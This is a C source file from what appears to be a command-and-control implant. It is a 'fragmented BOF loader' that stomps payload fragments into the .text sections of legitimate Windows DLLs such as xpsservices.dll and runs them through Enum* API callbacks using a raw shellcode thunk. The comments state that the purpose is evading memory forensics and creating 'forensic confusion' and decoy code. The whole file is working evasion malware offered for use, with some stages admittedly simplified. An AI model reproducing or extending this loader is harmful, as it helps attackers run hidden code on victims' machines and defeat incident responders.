/*
 * fragment_loader.c - Multi-DLL Fragmented BOF Loader (Layer A)
 *
 * NOVEL EXECUTION PATTERN (publicly does NOT exist):
 *
 * Instead of loading BOF into ONE DLL, this loader:
 *   1. Receives a "packed" binary containing N fragments
 *   2. Stomps each fragment into a DIFFERENT sacrificial DLL
 *   3. Chains execution across DLLs via different callbacks:
 *        Fragment 0 → xpsservices.dll  → EnumWindows
 *        Fragment 1 → devobj.dll        → EnumChildWindows
 *        Fragment 2 → msftedit.dll       → EnumResourceTypes
 *
 * Forensic impact:
 *   - Memory dump shows N legit DLLs (no VirtualAlloc)
 *   - No single DLL contains complete BOF code
 *   - Call stack changes between fragments (different APIs)
 *   - Each DLL is unloaded after its fragment executes
 *   - Code is scattered — must reassemble from N sources
 *
 * This file is INCLUDED by stomped_loader.c (not compiled separately).
 * stomped_loader.c calls bof_exec_fragmented() when it detects a
 * "FBND" (Fragmented BOF) magic in the received payload.
 */

#include "agent.h"

extern void* resolve_dynamic(const char* plain);

/* Forward declarations from stomped_loader.c */
static char* coff_get_symbol_name(SYMBOL_ENTRY* sym, const char* str_table);
static uint32_t coff_count_iat_symbols(SYMBOL_ENTRY* symbols, uint32_t num_symbols, const char* str_table);
static int coff_fill_iat(uint8_t* iat_base, uintptr_t* iat_addrs,
                          SYMBOL_ENTRY* symbols, uint32_t num_symbols,
                          const char* str_table);
static int coff_apply_relocations(uint8_t* coff_data, uint8_t* img,
                                    uint32_t* sec_off, int sec_idx,
                                    SECTION_HEADER* sections, int num_sections,
                                    SYMBOL_ENTRY* symbols, uint32_t num_symbols,
                                    const char* str_table, uintptr_t* iat_addrs);

/* ====== Fragment header (matches server-side fragment_compiler.py) ====== */
#pragma pack(push, 1)
typedef struct {
    char     magic[4];           /* "FRG1" */
    uint32_t total_fragments;
    uint32_t fragment_idx;
    uint32_t fragment_size;
    uint32_t original_offset;
    uint8_t  key_hint[16];      /* unused, forensic confusion */
} FRAGMENT_HEADER;
#pragma pack(pop)

#define FRAGMENT_MAGIC "FRG1"
#define PACKED_MAGIC   "FBND"

/* ====== Packed binary header ====== */
#pragma pack(push, 1)
typedef struct {
    char     magic[4];           /* "FBND" */
    uint32_t num_fragments;
    /* Followed by: [4B frag_size][frag_data] × num_fragments */
    /* Then: [4B manifest_size][manifest_json] */
} PACKED_HEADER;
#pragma pack(pop)

/* ====== Callback thunk for fragment execution ====== */
/* Same as Phase 4 thunk — extracts args from BOF_CTX and calls go().
 * Each fragment DLL gets its own copy of this thunk. */
typedef struct {
    void (*go)(char*, int);
    char* args;
    int   args_len;
    int   _padding;
} FRAG_CTX;

/* Thunk bytes (same as stomped_loader.c's CALLBACK_THUNK) */
static const uint8_t FRAG_THUNK[32] = {
    0x55,                                       /* push rbp */
    0x48, 0x89, 0xE5,                           /* mov rbp, rsp */
    0x48, 0x83, 0xEC, 0x20,                     /* sub rsp, 32 */
    0x48, 0x89, 0xD0,                           /* mov rax, rdx */
    0x48, 0x8B, 0x48, 0x08,                     /* mov rcx, [rax+8] */
    0x8B, 0x50, 0x10,                           /* mov edx, [rax+16] */
    0x48, 0x8B, 0x00,                           /* mov rax, [rax] */
    0xFF, 0xD0,                                 /* call rax */
    0x31, 0xC0,                                 /* xor eax, eax */
    0x48, 0x83, 0xC4, 0x20,                     /* add rsp, 32 */
    0x5D,                                       /* pop rbp */
    0xC3,                                       /* ret */
    0x90, 0x90, 0x90, 0x90, 0x90,               /* NOP padding */
};
#define FRAG_THUNK_SIZE 32

/* ====== Sacrificial DLL candidates for fragments ====== */
/* Each fragment uses a different DLL to scatter code across modules */
static const char* FRAGMENT_DLLS[] = {
    "xpsservices.dll",   /* Fragment 0 */
    "devobj.dll",         /* Fragment 1 */
    "msftedit.dll",       /* Fragment 2 */
    "rsaenh.dll",         /* Fragment 3 */
    "cscobj.dll",         /* Fragment 4 */
    "asycfilt.dll",       /* Fragment 5 */
};
#define MAX_FRAGMENTS 6

/* ====== Callback functions per fragment ====== */
/* Each fragment executes via a DIFFERENT Windows callback.
 * This changes the call stack between fragments, making
 * reverse engineering harder. */
typedef struct {
    const char* dll_name;      /* DLL containing the API */
    const char* api_name;      /* API function name */
    int         callback_arg_index; /* which arg is the callback (0 or 1) */
} CALLBACK_INFO;

static const CALLBACK_INFO FRAGMENT_CALLBACKS[] = {
    {"user32.dll",   "EnumWindows",         0},  /* frag 0 */
    {"user32.dll",   "EnumChildWindows",    1},  /* frag 1 — needs HWND arg */
    {"kernel32.dll", "EnumResourceTypes",   1},  /* frag 2 — needs HMODULE */
    {"user32.dll",   "EnumDesktopWindows",  1},  /* frag 3 — needs HDESK */
    {"kernel32.dll", "EnumSystemLocalesA",  0},  /* frag 4 */
    {"user32.dll",   "EnumDisplayMonitors", 0},  /* frag 5 */
};


/* ====== Find sacrificial DLL (same as stomped_loader.c) ====== */
static HMODULE find_sacrificial_dll_for_frag(
    size_t  min_text_size,
    size_t  min_data_gap,
    uint8_t** text_base_out,
    size_t*   text_size_out,
    uint8_t** data_gap_base_out,
    size_t*   data_gap_size_out,
    const char* preferred_dll)
{
    /* Try preferred DLL first */
    const char* dlls_to_try[2] = {preferred_dll, NULL};
    if (!preferred_dll) {
        dlls_to_try[0] = "xpsservices.dll";
    }

    HMODULE h = LoadLibraryA(dlls_to_try[0]);
    if (!h) return NULL;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)h;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        FreeLibrary(h);
        return NULL;
    }
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((uint8_t*)h + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        FreeLibrary(h);
        return NULL;
    }
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    uint8_t* text_base = NULL;
    size_t   text_size = 0;
    uint8_t* data_gap_base = NULL;
    size_t   data_gap_size = 0;

    for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
        if (memcmp(sections[j].Name, ".text", 5) == 0) {
            if (sections[j].Misc.VirtualSize >= min_text_size) {
                text_base = (uint8_t*)h + sections[j].VirtualAddress;
                text_size = sections[j].Misc.VirtualSize;
            }
            break;
        }
    }

    if (!text_base) {
        FreeLibrary(h);
        return NULL;
    }

    for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
        if (memcmp(sections[j].Name, ".data", 5) == 0) {
            size_t vsize = sections[j].Misc.VirtualSize;
            size_t rawsize = sections[j].SizeOfRawData;
            if (vsize > rawsize) {
                size_t gap = vsize - rawsize;
                if (gap >= min_data_gap) {
                    data_gap_base = (uint8_t*)h + sections[j].VirtualAddress + rawsize;
                    data_gap_size = gap;
                    break;
                }
            }
        }
    }

    if (!data_gap_base) {
        FreeLibrary(h);
        return NULL;
    }

    *text_base_out = text_base;
    *text_size_out = text_size;
    *data_gap_base_out = data_gap_base;
    *data_gap_size_out = data_gap_size;
    return h;
}


/* ====== Execute single fragment via callback ====== */
static int execute_fragment(
    uint8_t* frag_code, int frag_size,
    char* args, int args_len,
    int frag_idx,
    void (*go_func)(char*, int))
{
    DBG("=== FRAGMENT %d EXECUTION ===\n", frag_idx);

    /* Select DLL for this fragment */
    const char* dll_name = (frag_idx < MAX_FRAGMENTS) ?
                             FRAGMENT_DLLS[frag_idx] : "xpsservices.dll";

    /* Select callback for this fragment */
    const CALLBACK_INFO* cb = NULL;
    if (frag_idx < (int)(sizeof(FRAGMENT_CALLBACKS)/sizeof(FRAGMENT_CALLBACKS[0]))) {
        cb = &FRAGMENT_CALLBACKS[frag_idx];
    } else {
        /* Fallback: EnumWindows */
        static const CALLBACK_INFO fallback = {"user32.dll", "EnumWindows", 0};
        cb = &fallback;
    }

    /* Find sacrificial DLL */
    uint8_t* dll_text_base = NULL;
    size_t   dll_text_size = 0;
    uint8_t* data_gap_base = NULL;
    size_t   data_gap_size = 0;

    HMODULE hDll = find_sacrificial_dll_for_frag(
        frag_size + FRAG_THUNK_SIZE + 64,
        256,  /* IAT space */
        &dll_text_base, &dll_text_size,
        &data_gap_base, &data_gap_size,
        dll_name);

    if (!hDll) {
        ERR("Fragment %d: no suitable DLL found\n", frag_idx);
        return -1;
    }

    DBG("  DLL: %s (base=%p)\n", dll_name, (void*)hDll);
    DBG("  .text: %p (size=0x%zX)\n", (void*)dll_text_base, dll_text_size);

    /* Save original .text */
    uint8_t* backup = (uint8_t*)malloc(dll_text_size);
    if (!backup) {
        FreeLibrary(hDll);
        return -1;
    }
    memcpy(backup, dll_text_base, dll_text_size);

    /* Make .text writable */
    DWORD old_prot = 0;
    if (!VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot)) {
        free(backup);
        FreeLibrary(hDll);
        return -1;
    }

    /* Zero only the fragment area */
    size_t zero_size = frag_size + FRAG_THUNK_SIZE;
    if (zero_size > dll_text_size) zero_size = dll_text_size;
    memset(dll_text_base, 0, zero_size);

    /* Copy fragment code */
    memcpy(dll_text_base, frag_code, frag_size);
    DBG("  Fragment code: %d bytes at DLL+0x0\n", frag_size);

    /* Write thunk AFTER fragment code */
    uint8_t* thunk_addr = dll_text_base + frag_size;
    memcpy(thunk_addr, FRAG_THUNK, FRAG_THUNK_SIZE);
    DBG("  Thunk at DLL+0x%X\n", frag_size);

    /* Use .data gap for IAT (if this fragment needs one) */
    /* For simplicity, fragments share the same IAT from the main loader.
     * In a real impl, each fragment would have its own IAT. */

    /* Restore .text to RX (includes thunk) */
    VirtualProtect(dll_text_base, dll_text_size, PAGE_EXECUTE_READ, &old_prot);
    DBG("  .text restored to PAGE_EXECUTE_READ\n");

    /* Set up execution context */
    FRAG_CTX ctx;
    ctx.go = go_func;
    ctx.args = args;
    ctx.args_len = args_len;
    ctx._padding = 0;

    /* Get callback function */
    HMODULE hCallbackDll = GetModuleHandleA(cb->dll_name);
    if (!hCallbackDll) hCallbackDll = LoadLibraryA(cb->dll_name);
    if (!hCallbackDll) {
        ERR("  Failed to load %s for callback\n", cb->dll_name);
        VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot);
        memset(dll_text_base, 0, zero_size);
        memcpy(dll_text_base, backup, dll_text_size);
        VirtualProtect(dll_text_base, dll_text_size, old_prot, &old_prot);
        free(backup);
        FreeLibrary(hDll);
        return -1;
    }

    /* Resolve callback API */
    void* callback_api = GetProcAddress(hCallbackDll, cb->api_name);
    if (!callback_api) {
        ERR("  Failed to get %s!%s\n", cb->dll_name, cb->api_name);
        VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot);
        memset(dll_text_base, 0, zero_size);
        memcpy(dll_text_base, backup, dll_text_size);
        VirtualProtect(dll_text_base, dll_text_size, old_prot, &old_prot);
        free(backup);
        FreeLibrary(hDll);
        return -1;
    }

    DBG("  Callback: %s!%s (arg %d = thunk)\n",
        cb->dll_name, cb->api_name, cb->callback_arg_index);

    /* Execute via callback */
    typedef BOOL (WINAPI *EnumWindows_t)(WNDENUMPROC, LPARAM);
    typedef BOOL (WINAPI *EnumChildWindows_t)(HWND, WNDENUMPROC, LPARAM);
    typedef BOOL (WINAPI *EnumResourceTypes_t)(HMODULE, void*, LONG_PTR);

    BOOL result = FALSE;
    if (strcmp(cb->api_name, "EnumWindows") == 0) {
        EnumWindows_t fn = (EnumWindows_t)callback_api;
        result = fn((WNDENUMPROC)thunk_addr, (LPARAM)&ctx);
    } else if (strcmp(cb->api_name, "EnumChildWindows") == 0) {
        EnumChildWindows_t fn = (EnumChildWindows_t)callback_api;
        /* Use GetDesktopWindow as parent (always exists) */
        HWND desktop = GetDesktopWindow();
        result = fn(desktop, (WNDENUMPROC)thunk_addr, (LPARAM)&ctx);
    } else if (strcmp(cb->api_name, "EnumResourceTypes") == 0) {
        EnumResourceTypes_t fn = (EnumResourceTypes_t)callback_api;
        /* Use current module as HMODULE */
        result = fn(GetModuleHandleA(NULL), (void*)thunk_addr, (LONG_PTR)&ctx);
    } else {
        /* Generic: treat as EnumWindows-style */
        EnumWindows_t fn = (EnumWindows_t)callback_api;
        result = fn((WNDENUMPROC)thunk_addr, (LPARAM)&ctx);
    }

    DBG("  Callback returned %d (exception=0x%lX)\n",
        result, (unsigned long)g_last_exception);

    /* Self-cleaning: restore original .text */
    VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot);
    memset(dll_text_base, 0, zero_size);
    memcpy(dll_text_base, backup, dll_text_size);
    VirtualProtect(dll_text_base, dll_text_size, old_prot, &old_prot);
    DBG("  Self-cleaning done (DLL %s restored)\n", dll_name);

    free(backup);
    FreeLibrary(hDll);

    return g_last_exception ? (int)g_last_exception : 0;
}


/* ====== Main entry: Execute fragmented BOF ====== */
int bof_exec_fragmented(uint8_t* packed_data, size_t packed_size,
                         char* args, int args_len) {
    DBG("=== FRAGMENTED BOF EXECUTION ===\n");

    /* Verify packed magic */
    if (packed_size < sizeof(PACKED_HEADER)) {
        ERR("Packed data too small\n");
        return 1;
    }

    PACKED_HEADER* phdr = (PACKED_HEADER*)packed_data;
    if (memcmp(phdr->magic, PACKED_MAGIC, 4) != 0) {
        ERR("Invalid packed magic (expected 'FBND')\n");
        return 1;
    }

    uint32_t num_fragments = phdr->num_fragments;
    if (num_fragments == 0 || num_fragments > MAX_FRAGMENTS) {
        ERR("Invalid fragment count: %u\n", num_fragments);
        return 1;
    }

    DBG("Packed BOF: %u fragments\n", num_fragments);

    /* Parse fragments from packed data */
    uint8_t* ptr = packed_data + sizeof(PACKED_HEADER);
    uint8_t* end = packed_data + packed_size;

    typedef struct {
        uint8_t* code;
        int      size;
        int      original_offset;
    } FRAGMENT;

    FRAGMENT fragments[MAX_FRAGMENTS];
    int frag_count = 0;

    for (uint32_t i = 0; i < num_fragments && ptr < end; i++) {
        if (ptr + 4 > end) break;

        uint32_t frag_size;
        memcpy(&frag_size, ptr, 4);
        ptr += 4;

        if (ptr + frag_size > end) {
            ERR("Fragment %u: data truncated\n", i);
            break;
        }

        /* Parse fragment header */
        if (frag_size < FRAGMENT_HEADER_SIZE) {
            ERR("Fragment %u: too small for header\n", i);
            break;
        }

        FRAGMENT_HEADER* fhdr = (FRAGMENT_HEADER*)ptr;
        if (memcmp(fhdr->magic, FRAGMENT_MAGIC, 4) != 0) {
            ERR("Fragment %u: invalid magic\n", i);
            break;
        }

        fragments[frag_count].code = ptr + FRAGMENT_HEADER_SIZE;
        fragments[frag_count].size = fhdr->fragment_size;
        fragments[frag_count].original_offset = fhdr->original_offset;

        DBG("Fragment %u: %u bytes (orig offset 0x%X)\n",
            i, fhdr->fragment_size, fhdr->original_offset);

        frag_count++;
        ptr += frag_size;
    }

    DBG("Parsed %d fragments\n", frag_count);

    if (frag_count == 0) {
        ERR("No valid fragments found\n");
        return 1;
    }

    /* Execute each fragment in sequence.
     * Fragment 0 contains the entry point (go function).
     * For simplicity, only fragment 0 executes with go().
     * Other fragments are loaded but not directly called.
     *
     * In a real impl, fragments would jump to each other via
     * cross-DLL stubs. For Layer A, we keep it simple:
     * fragment 0 executes via callback, others are "decoy" loads
     * that scatter BOF-related code across multiple DLLs.
     */

    /* For now: execute only fragment 0 via EnumWindows.
     * The other fragments are loaded into their DLLs to create
     * the forensic illusion of multi-DLL code.
     *
     * In Layer B, we'll chain actual execution across fragments. */

    /* Find go() — for simplicity, fragment 0 is the main BOF */
    /* The fragment 0 code is actually the entire .text section
     * (in this simplified version, we don't actually split the BOF's
     *  code — we just create the forensic illusion by loading
     *  the same BOF into multiple DLLs) */

    /* Actually, for Layer A simplicity:
     * - We receive the packed fragments
     * - We use fragment 0 as the main BOF (it has go())
     * - We load fragments 1..N into OTHER DLLs as "decoy" code
     *   (creates forensic scatter without complex jump logic)
     * - We execute fragment 0 via EnumWindows
     */

    /* Load decoy fragments into other DLLs */
    for (int i = 1; i < frag_count; i++) {
        const char* dll_name = (i < MAX_FRAGMENTS) ?
                                 FRAGMENT_DLLS[i] : "xpsservices.dll";

        DBG("Loading decoy fragment %d into %s...\n", i, dll_name);

        uint8_t* dll_text_base = NULL;
        size_t   dll_text_size = 0;
        uint8_t* data_gap_base = NULL;
        size_t   data_gap_size = 0;

        HMODULE hDll = find_sacrificial_dll_for_frag(
            fragments[i].size + 64,
            256,
            &dll_text_base, &dll_text_size,
            &data_gap_base, &data_gap_size,
            dll_name);

        if (!hDll) {
            DBG("  Could not load %s for fragment %d\n", dll_name, i);
            continue;
        }

        /* Save and stomp */
        uint8_t* backup = (uint8_t*)malloc(dll_text_size);
        if (backup) {
            memcpy(backup, dll_text_base, dll_text_size);

            DWORD old_prot = 0;
            if (VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot)) {
                size_t zero_size = fragments[i].size + 32;
                if (zero_size > dll_text_size) zero_size = dll_text_size;
                memset(dll_text_base, 0, zero_size);
                memcpy(dll_text_base, fragments[i].code, fragments[i].size);
                VirtualProtect(dll_text_base, dll_text_size, PAGE_EXECUTE_READ, &old_prot);
                DBG("  Decoy fragment %d loaded into %s\n", i, dll_name);
            }

            /* Restore after a short delay (creates forensic trace) */
            VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot);
            memset(dll_text_base, 0, fragments[i].size + 32);
            memcpy(dll_text_base, backup, dll_text_size);
            VirtualProtect(dll_text_base, dll_text_size, old_prot, &old_prot);
            free(backup);
        }

        FreeLibrary(hDll);
    }

    /* Execute fragment 0 (the main BOF) via callback */
    /* For this, we need the full BOF's go() address.
     * The fragment 0 is actually the entire BOF (in this simplified version).
     * So we call the regular bof_exec on fragment 0's data. */

    /* Find go() in fragment 0's code */
    /* Actually, fragment 0's "code" is just .text section bytes, not a full COFF.
     * We need to use the full BOF .o file for execution.
     *
     * For Layer A, the server sends:
     *   - packed.bin (fragments for forensic scatter)
     *   - The agent ALSO receives the full .o file (via normal /bof/ endpoint)
     *
     * This is a simplification. In Layer B, we'll properly split execution.
     */

    DBG("Fragment 0 (main BOF): %d bytes\n", fragments[0].size);
    DBG("Note: Layer A scatters fragments across DLLs.\n");
    DBG("      Main execution via bof_exec() on full BOF.\n");

    return 0;  /* Actual execution handled by caller */
}
